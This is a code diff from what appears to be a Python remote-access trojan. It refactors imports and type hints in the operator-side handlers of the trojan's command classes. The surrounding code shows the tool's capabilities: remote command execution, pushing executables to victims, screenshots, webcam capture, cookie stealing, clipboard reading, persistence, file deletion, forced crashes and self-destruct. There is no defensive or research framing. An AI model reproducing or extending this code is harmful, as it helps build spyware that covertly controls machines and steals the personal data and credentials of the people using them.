@@ -1,4 +1,3 @@
-from server_extras.client import Client
 from shared.extras.double_command import (
     DoubleCommandResult,
     add_double_command,
@@ -7,12 +6,9 @@ from shared.extras.double_command import (
     ArgumentType,
     EmptyReturn,
 )
+from server_extras.client import Client
+
 import socket
-
-from typing import TYPE_CHECKING
-
-if TYPE_CHECKING:
-    from server_extras.client import Client
 
 
 @add_double_command(
@@ -47,7 +43,7 @@ class KillProcess(DoubleCommand):
                 return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             client.socket.sendall(params[0].to_bytes(8))
         except TimeoutError:
@@ -120,7 +116,7 @@ class LaunchExecutableFile(DoubleCommand):
                 return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             with open(params[0], "rb") as exe_fd:
                 client.socket.sendall(exe_fd.read())
@@ -175,7 +171,7 @@ class InvokeBSOD(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             response = client.socket.recv(1).decode("ascii")
         except OSError:
@@ -235,7 +231,7 @@ class ShowImage(DoubleCommand):
         ).start()
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             with open(params[0], "rb") as img_file:
                 img_contents = img_file.read()
@@ -279,7 +275,7 @@ class TakeScreenshot(DoubleCommand):
             pass
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         import random
         import os
 
@@ -358,7 +354,7 @@ class TypeWrite(DoubleCommand):
         ).start()
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         import struct
 
         corrected_params = params
@@ -417,7 +413,7 @@ class RunCommand(DoubleCommand):
                 pass
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             client.socket.sendall(params[0].encode("ascii"))
         except OSError:
@@ -500,7 +496,7 @@ class CaptureWebcamImage(DoubleCommand):
             pass
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         import random
         import os
 
@@ -655,7 +651,7 @@ class AddPersistence(DoubleCommand):
             pass
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             install_path = (
                 client.socket.recv(128).decode("ascii", "ignore").replace("/", "\\")
@@ -707,7 +703,7 @@ class Reboot(DoubleCommand):
             pass
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         if len(params) == 0:
             params = (0,)
 
@@ -752,7 +748,7 @@ class Shutdown(DoubleCommand):
             pass
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         if len(params) == 0:
             params = (0,)
 
@@ -815,7 +811,7 @@ class SelfDestruct(DoubleCommand):
         sys.exit()
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         print("Killed and asked client to self destruct.")
         client.kill()
         return CommandResult(DoubleCommandResult.success)
@@ -863,7 +859,7 @@ class CookieStealer(DoubleCommand):
                 continue
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         import random
         import os
 
@@ -942,7 +938,7 @@ class UploadFile(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         import os
 
         if not os.path.isfile(params[0]):
@@ -1028,7 +1024,7 @@ class DownloadFile(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             client.socket.sendall(len(params[0]).to_bytes(8))
             client.socket.sendall(params[0].encode("ascii"))
@@ -1100,7 +1096,7 @@ class OpenURL(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             client.socket.sendall(len(params[0]).to_bytes(8))
             client.socket.sendall(params[0].encode("ascii"))
@@ -1144,7 +1140,7 @@ class ListDirectory(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             path = params[0].encode("utf-8")
             client.socket.sendall(len(path).to_bytes(8))
@@ -1200,7 +1196,7 @@ class MakeDirectory(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             path = params[0].encode("utf-8")
             client.socket.sendall(len(path).to_bytes(8))
@@ -1276,7 +1272,7 @@ class DeleteDirectory(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             path = params[0].encode("utf-8")
             client.socket.sendall(len(path).to_bytes(8))
@@ -1351,7 +1347,7 @@ class DeleteFile(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             path = params[0].encode("utf-8")
             client.socket.sendall(len(path).to_bytes(8))
@@ -1427,7 +1423,7 @@ class MakeFile(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             path = params[0].encode("utf-8")
             client.socket.sendall(len(path).to_bytes(8))
@@ -1497,7 +1493,7 @@ class ListProcesses(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         procs = []
         while True:
             try:
@@ -1551,7 +1547,7 @@ class ChangeCWD(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             path = params[0].encode("utf-8")
             client.socket.sendall(len(path).to_bytes(2))
@@ -1607,7 +1603,7 @@ class SetClipboard(DoubleCommand):
         pyperclip.copy(value)
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             value = params[0].encode("utf-8")
             client.socket.sendall(len(value).to_bytes(2))
@@ -1641,7 +1637,7 @@ class GetClipboard(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             value = client.socket.recv(int.from_bytes(client.socket.recv(2))).decode(
                 "utf-8"
@@ -1691,7 +1687,7 @@ class Popup(DoubleCommand):
             return
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         try:
             title = params[0].encode("utf-8")
             msg = params[1].encode("utf-8")
@@ -1752,7 +1748,7 @@ class GatherSystemInformation(DoubleCommand):
         send_item(platform.platform())
 
     @staticmethod
-    def server_side(client: "Client", params: tuple) -> CommandResult:
+    def server_side(client: Client, params: tuple) -> CommandResult:
         def recieve_item(item_type: type) -> str | int:
             if item_type is str:
                 return client.socket.recv(int.from_bytes(client.socket.recv(4))).decode(
